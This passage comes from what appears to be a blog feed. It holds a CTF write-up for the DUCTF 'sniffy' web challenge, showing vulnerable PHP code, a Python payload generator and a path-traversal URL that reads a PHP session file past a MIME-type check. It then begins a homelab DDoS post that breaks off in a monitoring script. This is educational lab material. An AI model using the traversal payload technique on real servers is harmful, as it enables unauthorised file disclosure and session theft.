&lt;span class=&quot;err&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;theme&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;dark&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;light&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;dark&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
  
&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;  
  
&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;flag&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;FLAG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Flag is in the session here! */&lt;/span&gt;  
&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;theme&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;theme&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;theme&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;light&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here, it loads the flag into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$_SESSION&lt;/code&gt; variable. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$_SESSION&lt;/code&gt; is a global variable used by an individual user with a session. We also get a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;audio.php&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;  
  
&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;audio/&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;f&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;  
  
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;http_response_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
  
&lt;span class=&quot;nv&quot;&gt;$mime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mime_content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
  
&lt;span class=&quot;nb&quot;&gt;error_log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;print_r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$mime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;  
  
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$mime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;str_starts_with&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$mime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;audio&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;http_response_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;403&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
  
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Type: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$mime&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
&lt;span class=&quot;nb&quot;&gt;readfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There’s a pretty obvious Local File Inclusion and Path Traversal vulnerability. It looks like we can include almost any file on the container’s file system using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;f=&lt;/code&gt; argument, but it checks the result of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mime_content_type&lt;/code&gt; to see if it’s some kind of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;audio&lt;/code&gt; type. Doing some digging, it looks like this function pulls from configuration defined in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/magic.mime&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/magic&lt;/code&gt;. However, it doesn’t look like my files don’t contain any configuration. I spun my wheels a little bit, until I realized that this was all being run from the an Apache container. I started up the container by running:&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; sniffy &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; p 8080:80 sniffy 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then in a different tmux window, I ran:&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; sniffy /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Digging around in documentation, I found that Apache consults &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apache/magic&lt;/code&gt; when deciding a MIME type. I also &lt;em&gt;think&lt;/em&gt; that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; command consults this file. I found it in the running container, and I pulled that down to my host OS with:&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;sniffy:/etc/apache/magic &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In these config files, you can list a starting byte and a byte pattern to match. I’m sure you can do some more complex stuff but here it’s basically “Is there these bytes? Then it’s these data types.” On line 51, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/magic/mime&lt;/code&gt; declares that if the bytes 1080-1083 are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;M.K.&lt;/code&gt;, the file will be defined &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;audio/x-mod&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1080    string  M.K.            audio/x-mod
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;How does this help us? Well, here’s where I failed to recognize during the CTF that every session that is managed by a PHP runtime is actually a plaintext file under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/sess_&amp;lt;PHPSESSID&amp;gt;&lt;/code&gt;. Where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;PHPSESSID&amp;gt;&lt;/code&gt; is the cookie assigned by PHP for your session. Let’s test this out by visiting the web page and getting a session cookie:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PHPSESSID: p7n6b4g9vk20b2kh0cm5u87v0u
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can now enter the docker container with (assuming the container is still running):&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; /bin/bash sniffy
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And catting out that file:&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@baaa20612aq35:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;sess_p7n6b4g9vk20b2kh0cm5u87v0u
flag|s:7:&lt;span class=&quot;s2&quot;&gt;&quot;DUCTF{}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;theme|s:5:&lt;span class=&quot;s2&quot;&gt;&quot;light&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, looking at line 16 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt;, we can see that we have complete control over the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$_SESSION[&apos;theme&apos;]&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;theme&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;theme&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;theme&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;light&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This line of code will set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$_SESSION[&apos;theme&apos;]&lt;/code&gt; to the value of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;theme&lt;/code&gt; argument, if it’s present.&lt;/p&gt;

&lt;p&gt;We can test this out by visiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;localhost:8080/index.php?theme=asdfasdfasdf&lt;/code&gt; in the browser. Then we cat out the session file in the container:&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@baaa20612aq35:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;sess_p7n6b4g9vk20b2kh0cm5u87v0u
flag|s:7:&lt;span class=&quot;s2&quot;&gt;&quot;DUCTF{}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;theme|s:12:&lt;span class=&quot;s2&quot;&gt;&quot;asdfasdfadsf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Looks like we’re able to write arbitrary values to our session file. We now have a pretty straightforward process for constructing a payload:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Find a sequence of characters that will make the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mime_content_type&lt;/code&gt; call in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;audio.php&lt;/code&gt; think that the content that it is evaluating is some kind of audio type.&lt;/li&gt;
  &lt;li&gt;Set a user’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$_SESSION[&apos;theme&apos;]&lt;/code&gt; to that sequence of characters.&lt;/li&gt;
  &lt;li&gt;Visit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;audio.php&lt;/code&gt; and load the session file for that user, which will expose the flag!&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;For the sequence of characters, let’s choose the requirement that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;M.K.&lt;/code&gt; be in bytes 1080-1083, tricking the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mime_content_type&lt;/code&gt; call into thinking that the session file is actually an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;audio/x-mod&lt;/code&gt; file. Let’s do a quick and dirty python script to generate all 4 possible payloads:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;a&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;M.K.&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;-&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Visiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://web-sniffy-d9920bbcf9df.2024.ductf.dev/index.php?theme=M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K....&lt;/code&gt; will set the cookie. Now, looking at our cookie, we know what our session cookie is, and thus the path to our session file: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PHPSESSID: 03du87nmd49q40acbknvvc0prr&lt;/code&gt;. Trying to visit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://web-sniffy-d9920bbcf9df.2024.ductf.dev/audio.php?f=../../../../tmp/sess_03du87nmd49q40acbknvvc0prr&lt;/code&gt; returns a 403, which means that this payload didn’t work. Let’s try the second payload, where the repeating &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;M.K.&lt;/code&gt; is offset by one character. Success! It looks like it downloaded as an audio file too. Catting it out shows the (uniquely Australian) flag!&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;flag|s:52:&quot;DUCTF{koo-koo-koo-koo-koo-ka-ka-ka-ka-kaw-kaw-kaw!!}&quot;;theme|s:4097:&quot;aM.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K.M.K....
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I’m disappointed I wasn’t able to crack this challenge, but I’m very impressed with the final payload, and congratulate those who beat this challenge. The upshot is I’ve finally finally finally learned how to use containers. I never bothered to wade through the sea of terminology until now.&lt;/p&gt;

&lt;h3 id=&quot;music-from-this-week-month&quot;&gt;Music from this &lt;del&gt;week&lt;/del&gt; month&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://open.spotify.com/track/2f9XA7pBMjrHPO2cJW5XCu?si=9e65d8fd5d494392&quot;&gt;Llorar&lt;/a&gt; - Los Socios Del Ritmo
&lt;a href=&quot;https://open.spotify.com/track/3Iw4UVS7fo2TdD6Spmgqaj?si=edcd4b9d4f9c4f67&quot;&gt;Mentirosa&lt;/a&gt; - Rafaga
&lt;a href=&quot;https://open.spotify.com/track/43q0J3OPQvNq2UPU2Enu9X?si=4423e348fe474feb&quot;&gt;El Chico Del Apartamento 512&lt;/a&gt; - Selena
&lt;a href=&quot;https://open.spotify.com/track/1BwrMGGhPA6GarWIYaFrW8?si=27f5cef6428b4e3e&quot;&gt;La Vida es Un Carnaval&lt;/a&gt; - Celia Cruz
&lt;a href=&quot;https://open.spotify.com/track/3tkXg3freIdvTxN58YUPaG?si=2eeeb7326bd5409c&quot;&gt;Sleep Is For the Weak&lt;/a&gt; - The Dreadnoughts
&lt;a href=&quot;https://open.spotify.com/track/5XeSAezNDk9tuw3viiCbZ3?si=c5a575b494774eea&quot;&gt;Get Up Offa That Thing&lt;/a&gt;- James Brown
&lt;a href=&quot;https://open.spotify.com/track/59kHPbwyyCApYA8RQQEuXm?si=2fdfebc543534845&quot;&gt;Chattahoochee&lt;/a&gt; - Alan Jackson&lt;/p&gt;</content><author><name>Jake Mullins</name></author><category term="year-of-hacking" /><category term="python" /><summary type="html">For the 3 4 people that read this and have been waiting for me next post with bated breath, I started last month as a Security Engineer Intern at Affirm, so I moved out to beautiful (and busy) San Francisco on about 2 weeks notice for the summer. Things are a little crazy, to say the least. Now that life has chilled out a bit, I should be able to get back into my routine of publishing these posts. However, life will not return any sense of normalcy until I find a cheap Mexican spot that’s open 24/7 within half a mile of my coffin apartment in SOMA neighborhood. For now, I am relying on the endurance I acquired during the great Provo Rancheritos Remodeling Riots of 2022. Musing about my lack of good nutrition aside, I am thoroughly thankful for the opportunity to be working and living here.</summary></entry><entry><title type="html">Week 10 - DDoS In Practice</title><link href="http://localhost:4000/year-of-hacking-0xa" rel="alternate" type="text/html" title="Week 10 - DDoS In Practice" /><published>2024-06-10T00:00:00-06:00</published><updated>2024-06-10T00:00:00-06:00</updated><id>http://localhost:4000/Year-of-Hacking-0xa</id><content type="html" xml:base="http://localhost:4000/year-of-hacking-0xa">&lt;p&gt;This week, I’m going to take a look at some variants of DDoS attacks, particularly kinds that can be executed using out-of-the-box tools and basic scripting.&lt;/p&gt;

&lt;p&gt;To me, the concept &lt;strong&gt;D&lt;/strong&gt;enial &lt;strong&gt;o&lt;/strong&gt;f &lt;strong&gt;S&lt;/strong&gt;ervice implies exploiting some kind of vulnerability to cause a crash or something similar that causes a service to stop functioning. A &lt;strong&gt;D&lt;/strong&gt;istributed &lt;strong&gt;D&lt;/strong&gt;enial &lt;strong&gt;o&lt;/strong&gt;f &lt;strong&gt;S&lt;/strong&gt;ervice implies overloading an application by sheer traffic quantity.&lt;/p&gt;
&lt;h1 id=&quot;setup&quot;&gt;Setup&lt;/h1&gt;
&lt;p&gt;On a machine in my homelab, I set up an Apache web server on port 8080 using docker with a cap of 512 Megabytes of memory using the command:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; apache &lt;span class=&quot;nt&quot;&gt;--memory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;512m&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 8080:80 httpd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When curled, the Apache server returns this simple HTML.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jakemull@optiplex-9020-1:~/ddos$ curl localhost:8080
&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;It works!&amp;lt;/h1&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In a different tmux pane, I will run this python script that will alert me when the server is no longer responding:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;datetime&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;
  
&lt;span class=&quot;n&quot;&gt;IP_ADDR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;192.168.5.140&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;8080&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BASE_URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;f&quot;http://&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_ADDR&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/index.html&quot;&lt;/span&gt;
  
&lt;span class=&quot;n&quot;&gt;TYPICAL_RESPONSE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;It works!&amp;lt;/h1&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&quot;&lt;/span&gt;
  
&lt;span class=&quot;n&quot;&gt;start_time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
